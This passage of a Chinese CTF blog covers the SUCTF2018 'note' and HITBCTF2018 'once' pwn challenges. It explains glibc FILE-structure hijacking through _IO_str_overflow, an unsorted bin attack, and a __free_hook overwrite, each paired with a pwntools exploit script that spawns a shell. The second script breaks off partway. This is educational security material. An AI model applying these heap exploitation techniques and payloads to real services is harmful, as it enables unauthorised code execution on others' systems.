<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">356	&#123;</span></span><br><span class="line"><span class="number">357</span>	  JUMP_INIT_DUMMY,</span><br><span class="line"><span class="number">358</span>	  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line"><span class="number">359</span>	  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line"><span class="number">360</span>	  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line"><span class="number">361</span>	  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line"><span class="number">362</span>	  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line"><span class="number">363</span>	  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line"><span class="number">364</span>	  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line"><span class="number">365</span>	  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line"><span class="number">366</span>	  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line"><span class="number">367</span>	  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line"><span class="number">368</span>	  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line"><span class="number">369</span>	  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line"><span class="number">370</span>	  JUMP_INIT(read, _IO_default_read),</span><br><span class="line"><span class="number">371</span>	  JUMP_INIT(write, _IO_default_write),</span><br><span class="line"><span class="number">372</span>	  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line"><span class="number">373</span>	  JUMP_INIT(close, _IO_default_close),</span><br><span class="line"><span class="number">374</span>	  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line"><span class="number">375</span>	  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line"><span class="number">376</span>	  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line"><span class="number">377</span>	&#125;;</span><br></pre></td></tr></table></figure>
<p>如果我们能够控制_IO_str_overflow的地址，就能执行system函数了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">_IO_str_overflow (FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line"><span class="number">82</span>	&#123;</span><br><span class="line"><span class="number">83</span>	  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line"><span class="number">84</span>	  <span class="keyword">size_t</span> pos;</span><br><span class="line"><span class="number">85</span>	  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line"><span class="number">86</span>	      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line"><span class="number">87</span>	  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line"><span class="number">88</span>	    &#123;</span><br><span class="line"><span class="number">89</span>	      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line"><span class="number">90</span>	      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line"><span class="number">91</span>	      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line"><span class="number">92</span>	    &#125;</span><br><span class="line"><span class="number">93</span>	  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line"><span class="number">94</span>	  <span class="keyword">if</span> (pos &gt;= (<span class="keyword">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line"><span class="number">95</span>	    &#123;</span><br><span class="line"><span class="number">96</span>	      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="number">97</span>	        <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="number">98</span>	      <span class="keyword">else</span></span><br><span class="line"><span class="number">99</span>	        &#123;</span><br><span class="line"><span class="number">100</span>	          <span class="keyword">char</span> *new_buf;</span><br><span class="line"><span class="number">101</span>	          <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="number">102</span>	          <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="number">103</span>	          <span class="keyword">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="number">104</span>	          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line"><span class="number">105</span>	            <span class="keyword">return</span> EOF;</span><br><span class="line">    		 <span class="comment">//这里有一个相对地址的调用，函数地址是fp的某地址，参数为new_size.</span></span><br><span class="line"><span class="number">106</span>	          new_buf</span><br><span class="line"><span class="number">107</span>	            = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line"><span class="number">108</span>	          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">109</span>	            &#123;</span><br><span class="line"><span class="number">110</span>	              <span class="comment">/*          __ferror(fp) = 1; */</span></span><br><span class="line"><span class="number">111</span>	              <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="number">112</span>	            &#125;</span><br><span class="line"><span class="number">113</span>	          <span class="keyword">if</span> (old_buf)</span><br><span class="line"><span class="number">114</span>	            &#123;</span><br><span class="line"><span class="number">115</span>	              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line"><span class="number">116</span>	              (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line"><span class="number">117</span>	              <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line"><span class="number">118</span>	              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">119</span>	            &#125;</span><br><span class="line"><span class="number">120</span>	          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"><span class="number">121</span>	</span><br><span class="line"><span class="number">122</span>	          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line"><span class="number">123</span>	          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line"><span class="number">124</span>	          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line"><span class="number">125</span>	          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line"><span class="number">126</span>	          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"><span class="number">127</span>	</span><br><span class="line"><span class="number">128</span>	          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line"><span class="number">129</span>	          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line"><span class="number">130</span>	        &#125;</span><br><span class="line"><span class="number">131</span>	    &#125;</span><br><span class="line"><span class="number">132</span>	</span><br><span class="line"><span class="number">133</span>	  <span class="keyword">if</span> (!flush_only)</span><br><span class="line"><span class="number">134</span>	    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line"><span class="number">135</span>	  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line"><span class="number">136</span>	    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line"><span class="number">137</span>	  <span class="keyword">return</span> c;</span><br><span class="line"><span class="number">138</span>	&#125;</span><br></pre></td></tr></table></figure>
<p>通过IDA查看libc，找到<code>_IO_str_overflow</code>，可以看到，a1是<code>_IO_str_overflow</code>的第一个参数，即fp；要执行的函数偏移为<code>fp+224</code>，参数为<code>v7</code>。可以考虑把fp+224写为system的地址，v7写为/bin/sh的地址；v6就等于<code>(v7-100)/2</code>，而v6又是<code>*(fp+64)-v5</code>，<code>v5= *(fp+56)</code>，这样我们可以自己构造一个<code>_IO_FILE_plus</code>结构，然后在64和56偏移处放入v6和v5，并把vtable的地址设置为<code>_IO_str_jumps</code>结构体的地址，就能</p>
<p><img src="/2018/06/05/suctf2018-note/ida.png" alt="IDA查看参数"></p>
<p>总结一下，在malloc_printerr中函数的调用关系如下：</p>
<p><img src="/2018/06/05/suctf2018-note/stack.png" alt="函数调用栈"></p>
</li>
</ol>
<h2 id="举例分析–SUCTF2018-NOTE"><a href="#举例分析–SUCTF2018-NOTE" class="headerlink" title="举例分析–SUCTF2018 NOTE"></a>举例分析–SUCTF2018 NOTE</h2><h3 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p>依旧是菜单类的小游戏，有三个功能：添加、展示和删除。</p>
<p>在游戏开始之前，先对ptr进行了初始化。ptr是位于bss段的一个指针数组，在ptr[0]中写入了：Hello,Welcome to SUCTF,I letf something here!</p>
<p>add函数找到ptr中第一个为空的位置，分配size大小的空间，并输入内容，此处<strong>没有对输入内容的大小做限制</strong>。</p>
<p><img src="/2018/06/05/suctf2018-note/add.png" alt="add"></p>
<p>show函数通过索引找到对应内存，输出内容。</p>
<p><img src="/2018/06/05/suctf2018-note/show.png" alt="show"></p>
<p>dele函数会释放ptr[0]和qword_202078中存放地址对应的内存。</p>
<p><img src="/2018/06/05/suctf2018-note/dele.png" alt="dele"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在add中，对输入的内容长度未做限制，会造成堆溢出漏洞。利用堆溢出漏洞，可以构造出上述的<code>_IO_FILE_plus</code>结构。</p>
<p>首先，泄露system地址，还是常用的UAF，当dele释放之后，通过读取unsortedbin的FD指针，计算出libc的地址。</p>
<p>然后，为了能够执行构造的<code>_IO_FILE_plus</code>结构中vtable的<code>_IO_OVERFLOW</code>，要对<code>_IO_list_all</code>进行劫持，即在<code>_IO_flush_all_lockp</code>函数中对<code>_IO_list_all</code>的每一个结点进行遍历时，要让它检查我们伪造的结点。因此考虑用unsorted bin attack，使解链操作时，<code>*_IO_list_all = unsorted_chunk(av)</code>，即第一个结点位于unsorted bin的头部，这样，chain对应的位置恰好为第六个small bins头的位置。我们可以想办法把伪造的<code>_IO_FILE_plus</code>放在第六个small bins对应的大小里，即0x60。</p>
<p>采用的方法是，通过缓冲区溢出修改下一个位于unsorted bin 的chunk大小为0x61，在这个chunk里存放伪造的<code>_IO_FILE_plus</code>。此时再分配一个大于0x60大小的内存，由于unsorted bin中的块不能满足要求，则会先将这个块放入对应大小的small bins里，然后再查找下一块。查找下一块时由于unsorted bin attack已经破坏了chunk的FD，由此就会触发<code>malloc_printerr</code>函数，遍历<code>_IO_list_all</code>，第一个结点已经转移unsorted bin上，但不满足条件，于是通过chain字段找到下一个结点，也就是我们伪造的结点，最终能够执行<code>system</code>。</p>
<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./note'</span>)</span><br><span class="line">	libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	gdb.attach(p,<span class="string">"b _IO_str_overflow"</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	libc = ELF(<span class="string">'./libc6_2.24-12ubuntu1_amd64.so'</span>)</span><br><span class="line">	p = remote(<span class="string">'pwn.suctf.asuri.org'</span>,<span class="number">20003</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'(yes:1)'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>,<span class="string">'1'</span>*<span class="number">16</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak system address</span></span><br><span class="line">dele()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">offset =  <span class="number">0x7f1b15e2ab78</span><span class="number">-0x7f1b15a66000</span></span><br><span class="line">libc_base = libc_addr - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">malloc_hook = libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">io_list_all = libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">binsh_addr = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))+<span class="number">5</span></span><br><span class="line">log.info(<span class="string">'sys_addr:%#x'</span> %sys_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin attack </span></span><br><span class="line">fake_chunk = p64(<span class="number">0x8002</span>)+p64(<span class="number">0x61</span>) <span class="comment">#header</span></span><br><span class="line">fake_chunk += p64(<span class="number">0xddaa</span>)+p64(io_list_all<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake IO_FILE_PLUS</span></span><br><span class="line">fake_IFP = p64(<span class="number">0x2</span>)+p64(<span class="number">0xffffffffffffff</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> +p64((binsh_addr<span class="number">-0x64</span>)/<span class="number">2</span>)</span><br><span class="line">fake_IFP = fake_IFP.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_IFP += p64(sys_addr+<span class="number">0x420</span>)</span><br><span class="line">fake_IFP = fake_IFP.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vtable_addr = malloc_hook<span class="number">-0x1370</span><span class="comment">#+libc.symbols['_IO_str_jumps']</span></span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)</span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)</span><br><span class="line">fake_IFP += p64(vtable_addr)</span><br><span class="line">fake_IFP += p64(sys_addr)</span><br><span class="line">fake_IFP += p64(<span class="number">2</span>)</span><br><span class="line">fake_IFP += p64(<span class="number">3</span>) </span><br><span class="line">fake_IFP += p64(<span class="number">0</span>)*<span class="number">3</span> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">16</span> +fake_chunk+fake_IFP</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">16</span>,payload)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#add a large chunk</span></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2018/06/05/hitbctf2018-once/">
                hitbctf2018-once
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-06-05</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="once"><a href="#once" class="headerlink" title="once"></a>once</h1><h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p><em>once名字的来由大概是很多操作都只能做一次（误）</em></p>
<p>先执行二进制文件，根据输出的字符串定位各个函数。</p>
<p><strong>f1</strong>：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的<code>&amp;unk_202020</code>，其中<code>unk_202020[3]</code>为<code>off_202038</code>。新加入的结点插入到头部，用<code>off_202038</code>进行记录。这个逻辑我还是想了一会的，果然要多读源码。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f1.png" alt="f1函数"></p>
<p><strong>f2：</strong>在bss段有一个变量<code>dword_202064</code>，作为是否进行了写操作的标志。函数实现了向第一个结点内写入0x20个字节，这个功能仅能实现一次。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f2.png" alt="f2函数"></p>
<p><strong>f3：</strong>同样，bss有一个<code>dword_202060</code>变量，标识是否进行了结点删除的操作。函数实现了删除第一个结点。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f3.png" alt="f3函数"></p>
<p><strong>f4：</strong>函数里有一些子操作，输入1时，分配size大小的内存空间，并把对应标志置位。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f41.png" alt="f4-1"></p>
<p>​    输入2时，向ptr内输入size大小的内容。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f42.png" alt="f4-2"></p>
<p>​    输入3时，释放ptr内存。</p>
<p><img src="/2018/06/05/hitbctf2018-once/f43.png" alt="f4-3"></p>
<h2 id="漏洞及利用"><a href="#漏洞及利用" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h2><p>在f2里，用户可以输入0x20个字节，能够覆盖掉结点中的前后向指针。并且在f3的解链操作中，对前后向指针进行操作，能够将程序劫持到期待的位置。简称<code>offset_202038</code>为<code>first``,unk_202020</code>为<code>head</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   			<span class="comment">//f2向结点内写内容，覆盖node[3]的地址为addr</span></span><br><span class="line"><span class="comment">//first里记录的是node的地址</span></span><br><span class="line">first = *(first+<span class="number">3</span>)</span><br><span class="line"><span class="comment">//first = addr                        </span></span><br><span class="line">   			*(first+<span class="number">2</span>)=&amp;head</span><br><span class="line">   			<span class="comment">//*(addr+2)=&amp;head</span></span><br></pre></td></tr></table></figure>
<p>可以看出，最终能够实现向<code>addr+16</code>的地址处写入head地址。由于f4后续可以操作ptr变量，就使得<code>addr+16=&amp;ptr</code>，经过上述过程后，ptr的内容为head地址，那么后面就可以向data段和bss段任意写。</p>
<p>本题开启了PIE保护，也就是无法直接获取到GOT，BSS变量地址。实际上，二进制文件中的相对位置是不变的。由于.data段与.bss段相邻，且相差较少，可以通过修改最后一个个字节来修改node[3]的内容。<code>addr = &amp;ptr-16 = 0x202058</code>，发送最后一个字节0x58即可。</p>
<p><img src="/2018/06/05/hitbctf2018-once/1.png" alt=""></p>
<p><img src="/2018/06/05/hitbctf2018-once/2.png" alt="data段和bss段地址"></p>
<p>之后f4向ptr写入内容就相当于向<code>unk_202020</code>起始的位置写入内容。由于f2能够向<code>off_202038</code>中的地址写入内容，不妨将offset_202038的值写为 <code>__free_hook</code>的地址，之后调用f2就可以向这里写入<code>system</code>地址。为了再次利用f2函数，应该覆写位于bss中的dword_202064变量。这样，覆写了 <code>__free_hook</code>之后，再次调用free就会执行<code>system</code>，f4中的3调用了<code>free</code>函数，对ptr中地址进行释放，因此可以将ptr中的值覆写为<code>/bin/sh</code>的地址。</p>
<p>一共要进行三次写操作：</p>
<p>1.f2向<code>offset_202038</code>中写入24字节填充和1字节0x58覆盖后向指针</p>
<p>2.f4-2向ptr中写入<code>__free_hook</code>地址、<code>/bin/sh</code>地址和对一些标识位置位。</p>
<p>3.f2向<code>offset_202038</code>（<code>__free_hook</code>）写入<code>system</code>地址</p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./once'</span>)</span><br><span class="line"><span class="comment">#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./once'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'47.75.189.102'</span>, <span class="number">9999</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_1</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_2</span><span class="params">(string)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendline(string)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_3</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Invalid choice\n'</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#add a node</span></span><br><span class="line">fun_1()</span><br><span class="line"><span class="comment">#f4:ptr=malloc 0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"><span class="comment">#input node </span></span><br><span class="line">fun_2(<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'b'</span>*<span class="number">8</span> + chr(<span class="number">0x58</span>))</span><br><span class="line"><span class="comment">#remove node</span></span><br><span class="line">fun_3()</span><br><span class="line"><span class="comment">#write ptr</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\0'</span>+ <span class="string">'\0'</span>*<span class="number">0x10</span> + p64(libc.symbols[<span class="string">'__free_hook'</span>]) + 